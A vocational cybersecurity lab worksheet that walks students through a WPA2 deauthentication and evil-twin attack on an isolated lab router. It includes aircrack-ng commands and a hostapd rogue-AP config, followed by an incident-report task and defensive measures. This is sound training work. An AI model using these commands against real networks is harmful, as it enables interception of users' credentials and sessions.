# WEEK 8 — WiFi Attack Lab

<div class="session-meta">
  <span>📅 Week 8</span>
  <span>⏱ 2 Hours</span>
  <span>🔴 Phase 2 — Active Threat</span>
  <span>📋 ICTSAS214 · ICTSAS305</span>
</div>

---

!!! danger "MISSION BRIEF"
    **Incident Reference:** RBS-2025-008  
    **Classification:** TRAINING — CONTROLLED LAB ENVIRONMENT ONLY  
    
    Redback Systems management suspects an employee's laptop was compromised via a rogue
    access point at a local café. Your team has been tasked with **replicating the attack
    in a controlled lab** so you can understand the threat and advise staff.

    Today you are the attacker. Next week, you write the advisory.

---

## Learning Objectives

By the end of this session you will be able to:

- [ ] Explain how a deauthentication attack works and why WPA2 allows it
- [ ] Set up a rogue access point (evil twin) on an isolated lab network
- [ ] Capture a client reconnect using your Parrot OS machine
- [ ] Explain what an attacker could capture after a successful association
- [ ] Document the attack as a support ticket (AT1 Task)

---

## Background — Why This Works

Before you touch a keyboard, you need to understand the theory. If you can't explain the attack, you can't advise a client about it.

### The Problem With 802.11 Deauthentication

WiFi management frames — the packets that handle connecting, disconnecting, and roaming — are **not authenticated** in WPA2. This is not a bug someone forgot to fix. It was a deliberate design decision made in the 1990s that the industry has never fully walked back.

```
Client ──── "I want to connect" ────────► Access Point
Client ◄─── "You are connected" ────────  Access Point
  
Attacker ── "DEAUTH [spoofed from AP]" ─► Client
Client ── "I was just disconnected?!" 
Client ── [scans for networks]
Client ── [finds "TAFE_WiFi" with stronger signal]
Client ── "I want to connect" ────────► ATTACKER (not the real AP)
```

The client has no way to verify the deauth came from the real AP. WPA3 fixes this with Protected Management Frames (PMF), but WPA2 — which is everywhere — does not.

!!! warning "Real World Impact"
    This attack was used in [Operation: Fancy Bear (APT28)](https://www.ncsc.gov.uk) 
    targeting hotel WiFi networks to compromise guest laptops.
    It has been documented in multiple ACSC advisories.

---

## Lab Setup

!!! example "LAB — Equipment & Topology"

    **Your station has:**
    
    - Parrot OS machine (bare metal)
    - USB WiFi dongle with monitor mode support
    - Lab router (SSID: `REDBACK-LAB`) — this is your target
    - **Air-gapped from internet — dongle only connects to lab router**

    **Network topology for today:**

    ```
    [Lab Router: REDBACK-LAB]
           │
           ├── Student PC (target client)
           │
           └── [Your Parrot box] ← attacker
    ```

    ⚠️ **The lab router is isolated. Do NOT connect the dongle to TAFE wifi.**  
    Your lecturer will confirm the lab SSID before you start.

---

## Part 1 — Reconnaissance (30 min)

### Step 1 — Put your dongle in monitor mode

```bash
# Check your interface name first
ip link show

# Put it into monitor mode (replace wlan1 with your interface)
sudo airmon-ng start wlan1

# Verify monitor mode is active
iwconfig
# You should see wlan1mon (or similar)
```

!!! note "BRIEFING — What is monitor mode?"
    Normal WiFi adapters only capture packets addressed to them.
    Monitor mode tells the card to capture **everything** in range — 
    management frames, data frames, beacons from every AP nearby.
    This is passive. You are not transmitting anything yet.

### Step 2 — Scan for targets

```bash
# Start airodump — scan all channels
sudo airodump-ng wlan1mon
```

Find `REDBACK-LAB` in the output. Note down:

| Field | What it means | Your value |
|-------|--------------|------------|
| BSSID | MAC address of the AP | |
| CH | Channel | |
| ESSID | Network name | REDBACK-LAB |

```bash
# Lock onto your target channel (replace XX and YY:YY...)
sudo airodump-ng -c XX --bssid YY:YY:YY:YY:YY:YY wlan1mon
```

Leave this running. You'll see clients listed in the bottom half.

---

## Part 2 — The Deauthentication Attack (20 min)

### Step 3 — Send deauth frames

Open a **second terminal** and run:

```bash
# Send 10 deauth frames to all clients on the AP
# Replace AP_MAC with the BSSID you noted
sudo aireplay-ng --deauth 10 -a AP_MAC wlan1mon
```

Watch your first terminal. You should see clients disappear briefly and then reconnect.

!!! danger "STOP AND DISCUSS"
    Before continuing — your lecturer will pause here.
    
    **Discussion questions:**
    
    1. What did you observe in airodump when the deauth fired?
    2. The client had no warning this happened. Why is that a problem?
    3. What would a real attacker do at the moment the client reconnects?

---

## Part 3 — The Evil Twin (30 min)

### Step 4 — Stand up a rogue AP

Now you'll create an AP with the **same SSID** but stronger signal than the lab router.

```bash
# Install hostapd if not present
sudo apt install hostapd -y

# Create a config file
sudo nano /tmp/evil-twin.conf
```

Paste this config (update interface and channel):

```ini
interface=wlan1mon
driver=nl80211
ssid=REDBACK-LAB
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
```

```bash
# Start the rogue AP
sudo hostapd /tmp/evil-twin.conf
```

### Step 5 — Watch for the reconnect

In airodump you should see the target client associate with **your** AP instead of the lab router.

!!! success "MISSION COMPLETE — when you see a client connect to your AP"
    Screenshot airodump showing the client associated to your BSSID.
    This is your evidence for the AT1 task.

---

## Part 4 — Write the Incident Report (20 min)

This is where the **ICTSAS305 assessment evidence** lives. The attack is only half the job — a security professional has to document and communicate it.

!!! note "AT1 PRACTICAL TASK — Incident Report"
    **Maps to:** LAP Practical Task 9 (Incident Reports/Support Tickets)
    **Units:** ICTSAS305 elements 1.3, 1.4, 2.2, 2.3
    
    Write a short incident report as if you were advising a Redback Systems employee 
    whose laptop connected to a rogue AP at a café.
    
    Your report must include:
    
    - [ ] What happened (plain English, no jargon — client is non-technical)
    - [ ] What an attacker could have captured (credentials, session cookies, DNS queries)
    - [ ] What the client should do now (password changes, which accounts at risk)
    - [ ] How to prevent it in future (VPN, WPA3, asking IT before connecting)
    
    Use the [Redback Systems Incident Report Template](../resources/intranet.md#incident-report-template).

---

## Debrief — The Defence Side

You just ran the attack. Now flip it.

**Discussion — How do you defend against this?**

=== "For Users"
    - Always use a VPN on public WiFi
    - Check for the padlock (HTTPS) — but note this doesn't mean the *site* is safe, just the connection is encrypted
    - If your WiFi drops unexpectedly and reconnects — be suspicious
    - WPA3 networks with PMF enabled block deauth attacks entirely

=== "For Organisations"  
    - Deploy 802.11w (Protected Management Frames) on all APs
    - Use a WIDS (Wireless Intrusion Detection System) — some enterprise APs have this built in
    - Issue staff VPN clients and mandate their use off-premises
    - Train staff to report unexpected disconnects

=== "For the Network"
    - Segment guest WiFi from corporate network entirely
    - Monitor for duplicate SSIDs via WIDS
    - Use certificate-based authentication (802.1X) so clients verify the AP

---

## Unit Mapping

??? info "Assessment Evidence — Click to expand"

    | What you did | Unit | Element/PC |
    |---|---|---|
    | Ran deauth and documented the attack | ICTSAS214 | 2.1, 2.2 |
    | Identified the threat (rogue AP) | ICTSAS214 | 1.1, 1.2 |
    | Wrote incident report for client | ICTSAS305 | 1.3, 1.4, 2.2, 2.3 |
    | Advised client in plain language | ICTSAS305 | 2.8, 2.9 |
    | Documented additional requirements | ICTSAS305 | 2.3 |

---

## Resources

- [Aircrack-ng documentation](https://www.aircrack-ng.org/doku.php)
- [ACSC — Protecting Against WiFi Threats](https://www.cyber.gov.au)
- [802.11w — Protected Management Frames explained](https://en.wikipedia.org/wiki/IEEE_802.11w-2009)
- [Wireshark — Preview for next week](../sessions/session-09.md)

---

!!! warning "LEGAL & ETHICAL REMINDER"
    Everything you did today was on an **isolated lab network** you have explicit
    permission to test. Running deauth attacks or evil twin APs on any other network
    — including TAFE wifi — is illegal under the **Criminal Code Act 1995 (Cth)** 
    and the **Cybercrime Act 2001**.  
    
    The same skills that made you effective today make you employable.  
    They also make you prosecutable if misused. Your choice.
